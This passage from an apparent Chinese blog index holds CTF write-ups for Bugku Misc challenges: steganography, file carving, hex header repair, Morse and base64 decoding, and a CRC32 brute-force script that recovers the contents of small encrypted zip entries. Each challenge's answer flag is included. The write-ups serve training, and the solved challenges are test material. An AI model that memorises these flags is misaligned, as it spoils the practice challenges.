</figure><br>和之前的一道题有点类似，所以用winhex修改高度，拿到flag<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Bugku/Misc-2/19-05.png" alt="" title="" class="">                <p></p>            </figure><br><!--BUGKU{a1e5aSA}--></p><h1 id="爆照-08067CTF"><a href="#爆照-08067CTF" class="headerlink" title="爆照(08067CTF)"></a>爆照(08067CTF)</h1><p>flag格式 flag{xxx_xxx_xxx}<br>下载是一张动漫少女图片<br>拿进kali用binwalk扫一下先<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Bugku/Misc-2/20-01.png" alt="" title="" class="">                <p></p>            </figure><br>这么多压缩包。。。<br>接下来用dd提取出来<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Bugku/Misc-2/20-02.png" alt="" title="" class="">                <p></p>            </figure><br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Bugku/Misc-2/20-03.png" alt="" title="" class="">                <p></p>            </figure><br>88看到有张二维码<br>再次用binwalk扫描后发现，88、888、8888都有改动<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Bugku/Misc-2/20-04.png" alt="" title="" class="">                <p></p>            </figure><br>将88图中的二维码扫描得到 bilibili<br>888在备注里看到base64编码<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Bugku/Misc-2/20-05.png" alt="" title="" class="">                <p></p>            </figure><br>解码得到 silisili<br>8888里提取出图片<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Bugku/Misc-2/20-06.png" alt="" title="" class="">                <p></p>            </figure><br>扫码得到 panama<br>根据提示 flag格式 flag{xxx_xxx_xxx}<br>得到flag<br><!--flag{bilibili_silisili_panama}--></p><h1 id="图穷匕见"><a href="#图穷匕见" class="headerlink" title="图穷匕见"></a>图穷匕见</h1><p>图片下载后，先右键查看属性，有如下发现：<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Bugku/Misc-3/01-01.png" alt="" title="" class="">                <p></p>            </figure><br>用16进制编辑器（如010editor）打开图片，找到jpg的文件尾FF D9，发现其后还有大量的数据<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Bugku/Misc-3/01-02.png" alt="" title="" class="">                <p></p>            </figure><br>将之后的数据保存到txt中<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Bugku/Misc-3/01-03.png" alt="" title="" class="">                <p></p>            </figure><br>将数据按16进制-&gt;ASCII方式解码，思路就很明显了，下图中使用的是notepad++中的插件Converter进行解码<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Bugku/Misc-3/01-04.png" alt="" title="" class="">                <p></p>            </figure><br>解码结果如下，很明显是坐标的形式<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Bugku/Misc-3/01-05.png" alt="" title="" class="">                <p></p>            </figure><br>这时候再结合会画图吗的提示，将这些坐标做成一张图即可，用gnuplot这个工具比较方便，因此将坐标转为gnuplot能识别的格式 坐标1 坐标2<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Bugku/Misc-3/01-06.png" alt="" title="" class="">                <p></p>            </figure><br>在Linux中使用<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gunplot</span><br><span class="line">plot <span class="string">"文件名"</span></span><br></pre></td></tr></table></figure></p><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Bugku/Misc-3/01-07.png" alt="" title="" class="">                <p></p>            </figure><p>得到二维码<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Bugku/Misc-3/01-08.png" alt="" title="" class="">                <p></p>            </figure><br>扫描后得到flag<br><!--flag{40fc0a979f759c8892f4dc045e28b820}--></p><h1 id="convert"><a href="#convert" class="headerlink" title="convert"></a>convert</h1><p>进制转换 8位的bit<br>写个py<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">file1=open(<span class="string">'1.txt'</span>)</span><br><span class="line">s=file1.read()</span><br><span class="line">file2=open(<span class="string">'3.rar'</span>,<span class="string">'wb'</span>)</span><br><span class="line">s1=<span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(s),<span class="number">8</span>):</span><br><span class="line">        <span class="comment">#print (type(int(s[i:i+8],2)))</span></span><br><span class="line">        <span class="keyword">if</span> ((int(s[i:i+<span class="number">8</span>],<span class="number">2</span>))&lt;= <span class="number">15</span>):</span><br><span class="line">                print(hex(int(s[i:i+<span class="number">8</span>],<span class="number">2</span>)))</span><br><span class="line">                s1=s1+<span class="string">'0'</span>+hex(int(s[i:i+<span class="number">8</span>],<span class="number">2</span>)).replace(<span class="string">'0x'</span>,<span class="string">''</span>)</span><br><span class="line">                <span class="keyword">print</span> (s1)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">                s1+=hex(int(s[i:i+<span class="number">8</span>],<span class="number">2</span>)).replace(<span class="string">'0x'</span>,<span class="string">''</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> (s1)</span><br><span class="line">file2.write(binascii.a2b_hex(s1))</span><br></pre></td></tr></table></figure></p><p>打开rar是个图片，用WinHex打开发现base64<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Bugku/Misc-3/02-01.png" alt="" title="" class="">                <p></p>            </figure><br>解码得到flag<br><!--flag{01a25ea3fd6349c6e635a1d0196e75fb}--></p><h1 id="听首音乐"><a href="#听首音乐" class="headerlink" title="听首音乐"></a>听首音乐</h1><p>听首音乐放松放松吧~<br>下载地址：链接: <a href="http://pan.baidu.com/s/1gfvezBl" target="_blank" rel="noopener">http://pan.baidu.com/s/1gfvezBl</a> 密码: y6gh<br>下载后试听了下发现只有右声道，用音频软件（GoldWave）打开发现摩斯电码<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Bugku/Misc-3/03-01.png" alt="" title="" class="">                <p></p>            </figure><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">...../-.../-.-./----./..---/...../-..../....-/----./-.-./-.../-----/.----/---../---../..-./...../..---/./-..../.----/--.../-../--.../-----/----./..---/----./.----/----./.----/-.-.</span><br></pre></td></tr></table></figure></p><p>解密后得到flag<br><!--5BC925649CB0188F52E617D70929191C--></p><h1 id="好多数值"><a href="#好多数值" class="headerlink" title="好多数值"></a>好多数值</h1><p>下载一看是一堆RGB数值，应该是要转成图片<br>去网上找了下Python RGB转图片的脚本，结果直接搜到原题了。<br><a href="https://www.cnblogs.com/webFuckeeeer/p/4536776.html" target="_blank" rel="noopener">https://www.cnblogs.com/webFuckeeeer/p/4536776.html</a><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">x = <span class="number">503</span> <span class="comment">#x坐标  通过对txt里的行数进行整数分解</span></span><br><span class="line">y = <span class="number">122</span> <span class="comment">#y坐标  x*y = 行数</span></span><br><span class="line"></span><br><span class="line">im = Image.new(<span class="string">"RGB"</span>,(x,y))<span class="comment">#创建图片</span></span><br><span class="line">file = open(<span class="string">'1.txt'</span>) <span class="comment">#打开rbg值文件</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#通过一个个rgb点生成图片</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,x):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,y):</span><br><span class="line">        line = file.readline()<span class="comment">#获取一行</span></span><br><span class="line">        rgb = line.split(<span class="string">","</span>)<span class="comment">#分离rgb</span></span><br><span class="line">        im.putpixel((i,j),(int(rgb[<span class="number">0</span>]),int(rgb[<span class="number">1</span>]),int(rgb[<span class="number">2</span>])))<span class="comment">#rgb转化为像素</span></span><br><span class="line">im.show()</span><br></pre></td></tr></table></figure></p><p style="display:none;">flag{youc@n’tseeme}</p><h1 id="很普通的数独-ISCCCTF"><a href="#很普通的数独-ISCCCTF" class="headerlink" title="很普通的数独(ISCCCTF)"></a>很普通的数独(ISCCCTF)</h1><p>下载解压后一堆数独图片，把所有带数字的方框改成黑色<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Bugku/Misc-3/05-01.png" alt="" title="" class="">                <p></p>            </figure><br>应该是是一张二维码，刚好是25张，5X5组合起来。<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Bugku/Misc-3/05-02.png" alt="" title="" class="">                <p></p>            </figure><br>样子好像有点不对，这里需要把第1张、第5张和第21张互换位置，扫码得到base64值。<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Bugku/Misc-3/05-03.png" alt="" title="" class="">                <p></p>            </figure><br>Base64多次解码得到flag<br><!--flag{y0ud1any1s1}--></p><h1 id="好多压缩包"><a href="#好多压缩包" class="headerlink" title="好多压缩包"></a>好多压缩包</h1><p>打开一看里面一堆压缩包，都有加密过，这题需要用到CRC碰撞<br>找了网上大神写的Python2脚本，时间蛮长的。。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CrackCrc</span><span class="params">(crc)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> dic:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line">            <span class="keyword">for</span> p <span class="keyword">in</span> dic:</span><br><span class="line">                <span class="keyword">for</span> q <span class="keyword">in</span> dic:</span><br><span class="line">                    s = i + j + p + q</span><br><span class="line">                    <span class="keyword">if</span> crc == (binascii.crc32(s) &amp; <span class="number">0xffffffff</span>):</span><br><span class="line">                        f.write(s)</span><br><span class="line">                        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CrackZip</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> I <span class="keyword">in</span> range(<span class="number">68</span>):</span><br><span class="line">        file = <span class="string">'out'</span> + str(I) + <span class="string">'.zip'</span></span><br><span class="line">        f = zipfile.ZipFile(file, <span class="string">'r'</span>)</span><br><span class="line">        GetCrc = f.getinfo(<span class="string">'data.txt'</span>)</span><br><span class="line">        crc = GetCrc.CRC</span><br><span class="line">        CrackCrc(crc)</span><br><span class="line"></span><br><span class="line">dic = string.ascii_letters + string.digits + <span class="string">'+/='</span></span><br><span class="line">f = open(<span class="string">'out.txt'</span>, <span class="string">'w'</span>)</span><br><span class="line">CrackZip()</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure></p><p>输出base64值<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">z5BzAAANAAAAAAAAAKo+egCAIwBJAAAAVAAAAAKGNKv+a2MdSR0zAwABAAAAQ01UCRUUy91BT5UkSNPoj5hFEVFBRvefHSBCfG0ruGnKnygsMyj8SBaZHxsYHY84LEZ24cXtZ01y3k1K1YJ0vpK9HwqUzb6u9z8igEr3dCCQLQAdAAAAHQAAAAJi0efVT2MdSR0wCAAgAAAAZmxhZy50eHQAsDRpZmZpeCB0aGUgZmlsZSBhbmQgZ2V0IHRoZSBmbGFnxD17AEAHAA==</span><br></pre></td></tr></table></figure></p><p>解码后保存文本，用winhex查看<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Bugku/Misc-3/06-01.png" alt="" title="" class="">                <p></p>            </figure><br>发现存在rar的文件尾C43D7B00400700，但缺少文件头，于是补上rar的文件头526172211A0700<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Bugku/Misc-3/06-02.png" alt="" title="" class="">                <p></p>            </figure><br>在注释里发现flag<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Bugku/Misc-3/06-03.png" alt="" title="" class="">                <p></p>            </figure><br><!--flag{nev3r_enc0de_t00_sm4ll_fil3_w1th_zip}--></p><h1 id="妹子的陌陌"><a href="#妹子的陌陌" class="headerlink" title="妹子的陌陌"></a>妹子的陌陌</h1><p>下载是一张小姐姐的图片，先用Winhex打开看看<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Bugku/Misc-3/08-01.png" alt="" title="" class="">                <p></p>            </figure><br>查找到rar文件头，可以看到下面还有个txt文件，这里直接修改文件后缀名，首先尝试改为rar无法打开，改成zip后即可打开。<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Bugku/Misc-3/08-02.png" alt="" title="" class="">                <p></p>            </figure><br>然后提示输入密码，题目没有提示要爆破密码，想到之前的图片<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Bugku/Misc-3/08-03.png" alt="" title="" class="">                <p></p>            </figure><br>momo.txt内容<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Bugku/Misc-3/08-04.png" alt="" title="" class="">                <p></p>            </figure><br>摩斯电码解出来是个网站地址HTTP://ENCODE.CHAHUO.COM/<br>接下来是AES解密<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Bugku/Misc-3/08-05.png" alt="" title="" class="">                <p></p>            </figure><br>网址<a href="http://c.bugku.com/momoj2j.png" target="_blank" rel="noopener">http://c.bugku.com/momoj2j.png</a>下下来一张黑白颠倒的二维码，解码得到flag<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Bugku/Misc-3/08-06.png" alt="" title="" class="">                <p></p>            </figure><br><!--KEY{nitmzhen6}--></p><h1 id="流量分析-cnss"><a href="#流量分析-cnss" class="headerlink" title="流量分析(cnss)"></a>流量分析(cnss)</h1><p>追踪http流，可以看到有个网址<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Bugku/Misc-3/2018-07-25-09-41-12.png" alt="" title="" class="">                <p></p>            </figure><br>访问发现用户昵称下有base64<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Bugku/Misc-3/2018-07-25-09-42-06.png" alt="" title="" class="">                <p></p>            </figure><br>两次解码得到flag，格式cnss{}<br><!--cnss{b1libil1_A_gay_wEbsite}--></p><h1 id="猫片-安恒"><a href="#猫片-安恒" class="headerlink" title="猫片(安恒)"></a>猫片(安恒)</h1><p>原安恒2018年1月月赛题：喵喵喵 扫一扫<br>hint： LSB BGR NTFS<br>用<code>StegSolve</code>打开，直接翻页是不行的，用<code>Analyse</code>下的<code>Data Extract</code><br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Bugku/Misc-3/2018-08-20-16-52-11.png" alt="保存为新的png文件" title="" class="">                <p>保存为新的png文件</p>            </figure><br>删除文件头FFFE，同时将008c改为0118<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Bugku/Misc-3/2018-08-20-16-53-43.png" alt="如图所示" title="" class="">                <p>如图所示</p>            </figure><br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Bugku/Misc-3/2018-08-20-16-55-59.png" alt="QR Research扫码" title="" class="">                <p>QR Research扫码</p>            </figure><br>下载是个flag.rar文件，此时用到最后一个提示<code>NTFS</code><br>这是一种流隐写，需要用到工具<code>ntfstreamseditor</code><br>将文件解压出来，注意必须用<code>winrar</code>解压才行，会有报错提示，没有关系。<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Bugku/Misc-3/2018-08-20-17-02-00.png" alt="用ntfstreamseditor工具扫描文件所在文件夹" title="" class="">                <p>用ntfstreamseditor工具扫描文件所在文件夹</p>            </figure><br>得到pyc文件，在线python反编译地址：<a href="https://tool.lu/pyc/" target="_blank" rel="noopener">tool.lu/pyc/</a><br>得到脚本<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span><span class="params">()</span>:</span></span><br><span class="line">    flag = <span class="string">'*************'</span></span><br><span class="line">    ciphertext = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(flag)):</span><br><span class="line">        s = chr(i ^ ord(flag[i]))</span><br><span class="line">        <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">            s = ord(s) + <span class="number">10</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            s = ord(s) - <span class="number">10</span></span><br><span class="line">        ciphertext.append(str(s))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ciphertext[::<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line">ciphertext = [<span class="string">'96'</span>,<span class="string">'65'</span>,<span class="string">'93'</span>,<span class="string">'123'</span>,<span class="string">'91'</span>,<span class="string">'97'</span>,<span class="string">'22'</span>,<span class="string">'93'</span>,<span class="string">'70'</span>,<span class="string">'102'</span>,<span class="string">'94'</span>,<span class="string">'132'</span>,<span class="string">'46'</span>,<span class="string">'112'</span>,<span class="string">'64'</span>,<span class="string">'97'</span>,<span class="string">'88'</span>,<span class="string">'80'</span>,<span class="string">'82'</span>,<span class="string">'137'</span>,<span class="string">'90'</span>,<span class="string">'109'</span>,<span class="string">'99'</span>,<span class="string">'112'</span>]</span><br></pre></td></tr></table></figure></p><p>解码脚本<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span><span class="params">()</span>:</span></span><br><span class="line">    ciphertext = [<span class="string">'96'</span>,<span class="string">'65'</span>,<span class="string">'93'</span>,<span class="string">'123'</span>,<span class="string">'91'</span>,<span class="string">'97'</span>,<span class="string">'22'</span>,<span class="string">'93'</span>,<span class="string">'70'</span>,<span class="string">'102'</span>,<span class="string">'94'</span>,<span class="string">'132'</span>,<span class="string">'46'</span>,<span class="string">'112'</span>,<span class="string">'64'</span>,<span class="string">'97'</span>,<span class="string">'88'</span>,<span class="string">'80'</span>,<span class="string">'82'</span>,<span class="string">'137'</span>,<span class="string">'90'</span>,<span class="string">'109'</span>,<span class="string">'99'</span>,<span class="string">'112'</span>]</span><br><span class="line">    flag = <span class="string">''</span></span><br><span class="line">    ciphertext.reverse()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(ciphertext)):</span><br><span class="line">        <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">            s = int(ciphertext[i]) - <span class="number">10</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            s = int(ciphertext[i]) + <span class="number">10</span></span><br><span class="line">        s = chr(i ^ s)</span><br><span class="line">        flag += s</span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line">a = decode()</span><br><span class="line">print(a)</span><br></pre></td></tr></table></figure></p><p style="display:none;">flag{Y@e_Cl3veR_C1Ever!}</p><h1 id="2B"><a href="#2B" class="headerlink" title="2B"></a>2B</h1><p>下载是一张图片，用binwalk分理处一张B2的图片，咋一看两张图完全一样，仔细看发现B2里有条纹状的水印，这是应该一种盲水印<br>工具下载地址：<a href="https://github.com/linyacool/blind-watermark（记得点☆哦）" target="_blank" rel="noopener">https://github.com/linyacool/blind-watermark（记得点☆哦）</a><br>使用工具需要Python2的opencv库<br>pip安装：<code>pip install opencv-python</code><br>反变换解水印：<code>decode.py --original B2.png --image 2B.png --result extract.png</code><br><!--NUST{I_10v3_2B_F0r3v3r}--></p><h1 id="多彩"><a href="#多彩" class="headerlink" title="多彩"></a>多彩</h1><p>先是LSB，里面有个压缩包，需要密码解开。<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Bugku/Misc-4/2018-09-18-16-25-55.png" alt="LSB低位隐写" title="" class="">                <p>LSB低位隐写</p>            </figure><br>其他通道有YSL的标记，而<code>YSL</code>是口红的一种牌子，所以密码和色号有关（出题人真是变态）小声）<br>通过取色器的对比，找到色号<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1,27 ,59 ,11 ,23 ,7 ,57,1 ,1 ,76 ,222 ,1,1,50 ,214 ,6 ,77 ,50,53,214 ,6</span><br></pre></td></tr></table></figure></p><p>紧接着将色号转为二进制数值，再转成字符串，得到解压密码<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">a = [<span class="number">1</span>,<span class="number">27</span> ,<span class="number">59</span> ,<span class="number">11</span> ,<span class="number">23</span> ,<span class="number">7</span> ,<span class="number">57</span>,<span class="number">1</span> ,<span class="number">1</span> ,<span class="number">76</span> ,<span class="number">222</span> ,<span class="number">1</span>,<span class="number">1</span>,<span class="number">50</span> ,<span class="number">214</span> ,<span class="number">6</span> ,<span class="number">77</span> ,<span class="number">50</span>,<span class="number">53</span>,<span class="number">214</span> ,<span class="number">6</span>]</span><br><span class="line">aa =<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    aa +=bin(i)[<span class="number">2</span>:]</span><br><span class="line"><span class="keyword">print</span> aa</span><br><span class="line">b = str(aa)</span><br><span class="line"><span class="keyword">print</span> libnum.b2s(b)</span><br></pre></td></tr></table></figure></p><p>参考：<br>出题思路：<a href="https://github.com/Nu1LCTF/n1ctf-2018/blob/master/writeups/misc/Lipstick/Lipstick_CN.md" target="_blank" rel="noopener">Nu1LCTF/n1ctf-2018/Lipstick</a>，<a href="https://meta.tn/a/a3ba899a0fdeb3e9bc616181d43ffb93958846a89345fc9e77290738ca7d402b" target="_blank" rel="noopener">解题思路</a><br><a href="https://github.com/hellman/libnum" target="_blank" rel="noopener">libnum库</a>：<a href="https://www.cnblogs.com/pcat/p/7225782.html" target="_blank" rel="noopener">安装及使用教程</a><br><!--flag{White_Album_is_Really_worth_watching_on_White_Valentine’s_Day}--></p><h1 id="闪的好快"><a href="#闪的好快" class="headerlink" title="闪的好快"></a>闪的好快</h1><p>分解gif，逐针扫二维码，一共18张，<a href="https://zh.bloggif.com/gif-extract" target="_blank" rel="noopener">在线分解gif链接</a><br><!--SYC{F1aSh_so_f4sT}--></p><h1 id="come-game"><a href="#come-game" class="headerlink" title="come_game"></a>come_game</h1><p>玩一下，多了save1文件，用winhex打开，000132-&gt;000135,直接过关得到flag。<br><!--SYC{6E23F259D98DF153}--></p><h1 id="旋转跳跃"><a href="#旋转跳跃" class="headerlink" title="旋转跳跃"></a>旋转跳跃</h1><p>先用音频文件打开没发现什么异常，试听的时候真是吓到我了。。。<br>再看一遍题目，发现提示<code>key：syclovergeek</code>，猜测可能是音频隐写，这个时候需要用到<code>Mp3Stego</code>工具。<br><figure class="highlight bash"><figcaption><span>payload</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\MP3StegoDecode.exe -X .\sycgeek-mp3.mp3 -P syclovergeek</span><br></pre></td></tr></table></figure></p><!--SYC{Mp3_B15b1uBiu_W0W}--><h1 id="啊哒"><a href="#啊哒" class="headerlink" title="啊哒"></a>啊哒</h1><p>图片包含一个加密的压缩包，密码在文件属性详细信息的照相机型号里，需16进制转成字符。<br><!--flag{3XiF_iNf0rM@ti0n}--></p><p><br><br><br></p>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Bugku </tag>
            
            <tag> Misc </tag>
            
        </tags>
      
    </entry>
    
  
  
</search>
